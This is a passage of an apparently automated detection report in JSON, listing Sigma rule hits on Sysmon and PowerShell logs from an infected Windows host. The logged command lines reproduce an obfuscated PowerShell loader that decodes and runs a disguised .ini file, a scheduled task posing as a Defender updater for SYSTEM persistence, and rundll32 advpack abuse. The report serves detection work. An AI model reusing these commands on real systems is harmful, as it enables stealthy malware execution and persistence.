                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-6006-000000004800}; ProcessId=1952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "06b48fa7870d38bdf92b4d4a9b9c4a4df779bd405fdc5ba0e70911df20027ce1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Change PowerShell Policies to an Insecure Level",
                                                                       "rule_description":  "Detects use of executionpolicy option to set insecure policies",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5406-000000004800}; ProcessId=3616; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5706-000000004800}; ProcessId=3284; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5C06-000000004800}; ProcessId=2548; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-5F06-000000004800}; ProcessId=4592; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "0d7b38274ada42870a9b5fe59433cc701b21c18ef543b8c653d2e5dae0f93c0e",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potentially Suspicious Rundll32 Activity",
                                                                       "rule_description":  "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities",
                                                                       "rule_author":  "juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; ProcessId=1848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; ProcessId=2052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5D06-000000004800}; ProcessId=7116; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-6006-000000004800}; ProcessId=1952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "1429a6819ff25aad68fb09601fb0b63c4be24919adfd25c4ad925ef8d47d8f22",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WmiPrvSE Spawned A Process",
                                                                       "rule_description":  "Detects WmiPrvSE spawning a process",
                                                                       "rule_author":  "Roberto Rodriguez @Cyb3rWard0g"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; ProcessId=1848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; ProcessId=2052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5D06-000000004800}; ProcessId=7116; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-6006-000000004800}; ProcessId=1952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "1ca8739651295d88708cb5ddfb7a115ae0d202152a80ee4c7871e62f3509c938",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential WMI Lateral Movement WmiPrvSE Spawned PowerShell",
                                                                       "rule_description":  "Detects Powershell as a child of the WmiPrvSE process. Which could be a sign of lateral movement via WMI.",
                                                                       "rule_author":  "Markus Neis @Karneades"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=22; ProcessId=1848; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=-; QueryName=api.ipify.org; UtcTime=1698181566; QueryStatus=0; QueryResults=type:  5 api4.ipify.org;::ffff:104.237.62.212;::ffff:173.231.16.77;::ffff:64.185.227.156;; ProcessGuid={C784477D-1F52-6565-5506-000000004800}}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=22; ProcessId=1848; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=-; QueryName=api.ipify.org; QueryResults=type:  5 api4.ipify.org;::ffff:104.237.62.212;::ffff:173.231.16.77;::ffff:64.185.227.156;; QueryStatus=0; UtcTime=1698181567; ProcessGuid={C784477D-1F52-6565-5506-000000004800}}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=22; ProcessId=2052; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; QueryName=api.ipify.org; QueryResults=type:  5 api4.ipify.org;::ffff:64.185.227.156;::ffff:104.237.62.212;::ffff:173.231.16.77;; QueryStatus=0; UtcTime=1698181574; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=22; ProcessId=2052; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; QueryName=api.ipify.org; UtcTime=1698181574; QueryStatus=0; QueryResults=type:  5 api4.ipify.org;::ffff:104.237.62.212;::ffff:173.231.16.77;::ffff:64.185.227.156;; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "3a2766a08d32a855b604a786cddc0f76fee13e6ccd22e01d4878150f0ef1eebc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious DNS Query for IP Lookup Service APIs",
                                                                       "rule_description":  "Detects DNS queries for IP lookup services such as \"api.ipify.org\" originating from a non browser process.",
                                                                       "rule_author":  "Brandon George (blog post), Thomas Patzke"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=d612f2b9-dc35-4b8e-9c63-0f05be222ffd\n\tHostApplication=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=82526f99-e06c-44c9-b9bd-b9f69525e497\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=c85686d1-d121-47d9-876e-2f4f4b6de6cb\n\tHostApplication=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=981afdc7-3fa1-40c2-b2c9-a509c99bb770\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=28f6a136-6224-4bee-9730-67891b17a3a0\n\tHostApplication=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=61015a6b-92ad-4db3-a78b-dc33b1e48764\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             },
                                                                                             {
